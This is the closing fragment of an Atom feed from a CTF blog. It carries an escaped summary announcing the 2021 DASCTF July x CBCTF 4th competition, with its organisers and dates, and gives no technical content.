&lt;p&gt;2021 DASCTF实战精英夏令营预热赛&lt;br&gt;DASCTF July x CBCTF 4th&lt;br&gt;主办单位: 安恒信息、杭州电子科技大学网络空间安全学院&lt;br&gt;竞赛时间: 2021年7月31日10:00- 2021年8月1日18:00&lt;br&gt;</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021赛" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
</feed>
